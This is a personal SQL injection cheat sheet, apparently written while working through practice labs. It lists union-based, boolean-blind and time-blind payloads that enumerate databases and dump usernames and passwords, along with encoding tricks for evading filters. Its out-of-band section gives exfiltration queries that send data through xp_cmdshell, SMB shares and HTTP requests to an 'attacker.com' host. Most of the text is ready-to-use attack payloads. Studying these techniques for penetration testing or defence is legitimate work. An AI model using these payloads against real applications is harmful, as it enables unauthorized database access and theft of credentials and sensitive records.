

  ## SQLi

- In-Band SQLi - result on same webpage
- Error-Based SQLi -err is printed on the website, revealing the database structure
- union-bases SQLi - use union with select query
- Examples:
	- get version based on error message`SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`
	- boolean based: `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`
	- time based: `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`

### In-band SQLi
- All of these are based on MySQL syntax

```sql
  
# exploit query: select * from article where id = 5'

1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3


# get the database name

0 UNION SELECT 1,2,database()


# List of tables for database 'sqli_one'

0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

# find table structure of 'staff_users'

0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

  
# get the table row from 'staff_users'
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

```  

### Blind SQLi - Boolean
```sql
# Simple injection
select * from users where username='' and password='' OR 1=1;
  

# Boolean SQLi - response has two outcome: pass or fail
# See for which query, response is a success
  

# get columns
admin123' UNION SELECT 1,2,3;--


# Get database name
admin123' UNION SELECT 1,2,3 where database() like 's%';--
admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
admin123' UNION SELECT 1,2,3 where database() like 'sql%';--



# Get table name

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'us%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'use%';--


# get columns in a table

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'p%';

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'pa%';

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'pas%';


# exclude found columns
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'pass%' and COLUMN_NAME !='id';

# Get table data
admin123' UNION SELECT 1,2,3 from users where username like 'a%
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%

  ```

### Blind SQLi - time based

```sql
# Get columns
admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5), 2;--


# get database
admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
# other queries are same as boolean, with sleep(5) as extra param
```


## Evasion
- **URL Encoding**:  the payload `' OR 1=1--` can be encoded as `%27%20OR%201%3D1--`. 
- **Hexadecimal Encoding**: the query `SELECT * FROM users WHERE name = 'admin'` can be encoded as `SELECT * FROM users WHERE name = 0x61646d696e`. 
- **Unicode Encoding**: the string `admin` can be encoded as `\u0061\u0064\u006d\u0069\u006e`.
- **Using Numerical Values**: instead of injecting `' OR '1'='1`, use `OR 1=1` 
- **Using SQL Comments**:  the input `admin'--` can be transformed into `admin--`, 
- **Using CONCAT() Function**:  `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)`constructs the string admin.
- **Comments to Replace Spaces**: instead of `SELECT * FROM users WHERE name = 'admin'`,  use `SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'`.    
- **Tab or Newline Characters**:  `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`.     
- **Alternate Characters**:  alternative URL-encoded characters representing different types of whitespace, such as `%09` (horizontal tab), `%0A` (line feed), `%0C` (form feed), `%0D` (carriage return), and `%A0` (non-breaking space)

## Out of Bound
- mariadb: `SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';`
- mssql: `EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`. Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.
- oracle: 
```sql
DECLARE 
	req UTL_HTTP.REQ;
	resp UTL_HTTP.RESP;
BEGIN 
	req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
	UTL_HTTP.GET_RESPONSE(req);
END;
```
- SMB exfil: `SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';`
- HTTP exfil: ``SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`.`
- 